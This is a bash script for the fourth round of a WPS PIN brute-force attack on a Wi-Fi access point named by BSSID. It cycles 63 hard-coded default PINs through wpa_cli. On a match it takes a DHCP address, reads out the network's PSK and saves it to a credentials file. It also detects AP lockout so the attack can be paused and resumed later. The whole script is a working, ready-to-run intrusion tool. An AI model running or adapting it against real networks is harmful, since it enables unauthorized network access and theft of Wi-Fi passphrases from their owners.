#!/bin/bash
# wps_try_r4.sh - WPS round 4: 63 CHECKSUM-VALID documented-default PINs never
# tested over the air (rounds 1-3 mostly died on local checksum validation;
# only ~6 PINs ever really negotiated). Aborts on AP lockout signs.
# Run as root. wlan0 untouched. Usage: ./wps_try_r4.sh <BSSID> <SSID> <outdir>
set -u
BSSID="${1:?bssid}"; SSID="${2:?ssid}"; OUT="${3:-./results-b1-wps4}"
CTRL=/run/wpa_supplicant_pwn
IF=wlan1
mkdir -p "$OUT"
PINS="11111115 22222220 33333335 44444440 55555555 66666660 77777775 88888880 87654325 20080846 49804348 01472653 28339458 02763408 54985780 71531762 10000762 00056724 41896990 08507716 12344321 12456789 23456785 34567890 45678905 56789010 67890125 78901230 89012345 90123450 01234565 10203040 11122234 12341238 12121212 13131319 23232327 45454547 56565652 78787872 89898987 00001113 11110002 24681353 13579241 06299095 34720950 96376164 56619096 40201825 81397549 75296186 88457666 30575677 40506012 08759078 03928479 12345601 00012348 43210008 99999995 55555326 28296607"
echo "[*] WPS PIN sweep round 4 vs $SSID ($BSSID), $(echo $PINS | wc -w) PINs (all checksum-valid)" | tee "$OUT/wps.log"

before_ids() { wpa_cli -p $CTRL -i $IF list_networks 2>/dev/null | tail -n +2 | cut -f1 | tr '\n' ' '; }
cleanup_new() {
  for N in $(before_ids); do
    skip=0; for O in $1; do [ "$N" = "$O" ] && skip=1; done
    [ $skip -eq 0 ] && wpa_cli -p $CTRL -i $IF remove_network "$N" >/dev/null 2>&1
  done
  wpa_cli -p $CTRL -i $IF wps_cancel >/dev/null 2>&1
}
ignores=0
for PIN in $PINS; do
  OLD=$(before_ids)
  echo "[*] trying PIN $PIN ..." | tee -a "$OUT/wps.log"
  R=$(wpa_cli -p $CTRL -i $IF wps_pin "$BSSID" "$PIN" 2>&1)
  echo "    wps_pin -> $R" | tee -a "$OUT/wps.log"
  if echo "$R" | grep -qi fail; then echo "    (rejected locally, skipping)" | tee -a "$OUT/wps.log"; cleanup_new "$OLD"; continue; fi
  S=$(date +%s); DONE=0; NEGOTIATED=0
  while [ $(( $(date +%s) - S )) -lt 25 ]; do
    ST=$(wpa_cli -p $CTRL -i $IF status 2>/dev/null | grep ^wpa_state=)
    echo "    $ST" >>"$OUT/wps.log"
    if [ "$ST" = "wpa_state=COMPLETED" ]; then DONE=1; break; fi
    case "$ST" in
      wpa_state=ASSOCIATING|wpa_state=ASSOCIATED|wpa_state=4WAY_HANDSHAKE|wpa_state=GROUP_HANDSHAKE) NEGOTIATED=1;;
    esac
    sleep 2
  done
  if [ $DONE -eq 1 ]; then
    echo "[+] WPS SUCCESS PIN=$PIN" | tee -a "$OUT/wps.log"
    dhcpcd --timeout 8 $IF >/dev/null 2>&1; sleep 2
    IP=$(ip -4 -o addr show $IF 2>/dev/null | grep -oP 'inet \K\S+')
    NETID=$(wpa_cli -p $CTRL -i $IF list_networks 2>/dev/null | tail -1 | cut -f1)
    PSK=$(wpa_cli -p $CTRL -i $IF get_network "$NETID" psk 2>/dev/null)
    echo "$SSID:WPS-PIN-$PIN / PSK=$PSK / IP=$IP" | tee "$OUT/creds.txt"
    exit 0
  fi
  cleanup_new "$OLD"
  if [ $NEGOTIATED -eq 0 ]; then
    ignores=$((ignores+1))
    echo "[!] AP ignored WPS attempt ($ignores in a row) - possible lockout" | tee -a "$OUT/wps.log"
    [ $ignores -ge 3 ] && { echo "[STOP] AP appears WPS-locked. Waiting out lockout; do not retry for a while." | tee -a "$OUT/wps.log"; exit 2; }
  else
    ignores=0
    echo "[ ] PIN $PIN failed (AP negotiated, PIN wrong)" | tee -a "$OUT/wps.log"
  fi
done
echo "[DONE] WPS round 4 finished, no hit." | tee -a "$OUT/wps.log"
exit 1
